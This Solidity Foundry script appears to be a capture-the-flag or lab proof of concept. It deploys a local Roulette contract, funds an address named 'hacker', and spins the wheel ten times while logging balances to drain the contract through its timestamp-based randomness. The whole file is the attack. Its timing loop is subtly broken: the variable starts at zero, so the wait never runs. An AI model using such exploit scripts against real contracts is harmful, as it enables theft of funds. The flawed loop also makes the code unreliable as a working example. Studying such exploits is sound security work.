// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/roulette.sol";

contract POC is Script {
    Roulette public target;
    address public hacker;

    function setUp() external {
        hacker = vm.addr(0x12345678);
        target = new Roulette();
        vm.deal(address(hacker), 1 ether);
        vm.deal(address(target), 10 ether);
    }

    function run() external {
        vm.startPrank(hacker);

        uint256 hacker_balance = address(hacker).balance;
        uint256 target_balance = address(target).balance;

        console.log("before hacker balance: ", hacker_balance);
        console.log("before target balance: ", target_balance);

        for (uint256 i = 0; i < 10; i++) {
            uint256 pastTimestamp;

            while (pastTimestamp % 3 != 0) { 
                pastTimestamp = block.timestamp;
            }

            target.spin{ value: 1 ether }();
        }
        
        hacker_balance = address(hacker).balance;
        target_balance = address(target).balance;

        console.log("after hacker balance: ", hacker_balance);
        console.log("after target balance: ", target_balance);
    }

}